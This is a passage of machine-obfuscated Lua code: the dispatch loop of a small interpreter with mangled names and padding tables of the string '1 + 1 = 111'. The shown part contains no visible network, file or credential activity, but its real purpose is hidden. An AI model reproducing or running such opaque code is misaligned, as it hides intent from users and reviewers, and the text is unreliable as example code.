111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lvK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cN37")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3D")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QTj")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("EHSy")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Eb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{395;370;273;477};{468;672;365;816};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("xBQ3")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vr")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("57u")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6W")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("L5Q")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("C60Q")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kb")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Rda")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5K")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("cpk")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ut")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{343;575;819;80};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VQP1")]];else ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sz1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wz")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{384;317;151;920};"1 + 1 = 111";{722;88;33;2};{660;121;813;678};"1 + 1 = 111";"1 + 1 = 111";{332;935;17;65};{270;996;380;513};}then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6v")]]<ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qdau")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("y6a")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll==#{{866;987;443;800};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{134;25;345;560};"1 + 1 = 111";"1 + 1 = 111";{509;858;194;706};{448;989;578;132};"1 + 1 = 111";{136;646;445;240};{387;578;542;157};{354;526;253;111};}then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("JH")];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl>ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("jQ7")];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl<ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("HYI")];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end else local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("IZ")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xy1")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vq0B")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("O8")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oVk")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("yN")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("uTY")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Igq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("iuhn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cF")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("sD1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("on")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gGk")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ndRG")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ql")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Bj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("M5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{847;957;262;414};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qjOY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("RVQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ySz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{494;361;158;955};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Mm")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("nUE")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Jz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("hKR")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("v7cS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("m6")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{996;721;195;96};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{512;738;7;56};{178;65;720;764};"1 + 1 = 111";}]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AGy0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LX")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("mlV")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("MU")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Ljb")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zR")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zKT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("fLp5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sr")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("B10")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("h5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dst")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{193;318;158;686};"1 + 1 = 111";{140;349;506;941};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qh")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("cGH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wh")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UgL")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("S8j1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{387;891;422;468};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tpq")]]*ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gzms")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AD")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("DZl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("v3rB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("6M6")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";"1 + 1 = 111";{720;902;356;314};{848;22;955;122};"1 + 1 = 111";{509;284;853;789};"1 + 1 = 111";{274;510;416;145};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{397;287;261;375};{499;237;80;46};"1 + 1 = 111";"1 + 1 = 111";}then if ajefa_IIIlIllIllllIIllIlllIIll<=#("eobUUG6mFDeNZsS5")then ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{{622;441;9;828};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mc")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{993;402;210;407};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{826;97;530;733};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{51;208;306;308};{796;987;79;184};{594;528;826;928};"1 + 1 = 111";{805;783;247;906};}then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5P")]]=#ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("14M")]];else local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("1a")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("krzT")];local ajefa_IlIIllIIIl=ajefa_lIIllIlIIlllII+2 local ajefa_lIIllIlIIlllII={ajefa_lIlllIll[ajefa_lIIllIlIIlllII](ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1],ajefa_lIlllIll[ajefa_IlIIllIIIl])};for ajefa_lllIIlIllIlIllllIIlIIlll=1,ajefa_IIIlIllIllllIIllIlllIIll do ajefa_lIlllIll[ajefa_IlIIllIIIl+ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll];end;local ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII[1]if ajefa_lIIllIlIIlllII then ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIIllIlIIlllII ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("23a")];else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("YfIenxXhFE4Gd0J5mtO")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("r4")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])elseif ajefa_IIIlIllIllllIIllIlllIIll>#("4Zy8KgyKECncXu40FG9k")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("k1")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S5X")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RP1s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("OBc")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("AC")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("JNy")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sct")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("P4SU")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kY")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("UxBP")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("POO")];end;else local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0B")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("vpO")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("ym")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("o9E")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xYkV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wm")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("FdG")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0X")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("pM8")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Rp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bFJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("btf2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wy")]]==ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("msZs")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("JCF")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("d3j0NvTdfYH5kd8RKEg9nNdp2TS6SBQt")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("L16oh7VPGyORhMq5j5c2lcA038")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("NWuPhnBJmcDCHvtRpzJUgCa")then if ajefa_IIIlIllIllllIIllIlllIIll>#("GOBrJCgujch2kTHEQde2RE")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FL")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{777;759;285;149};"1 + 1 = 111";"1 + 1 = 111";}]]+ajefa_lllIIlIllIlIllllIIlIIlll[#("ZB3M")];else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("pN")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]()end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("H1ukBuoXlVWjDWjaV6hrEnCG")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{32;526;429;538};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ka2")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 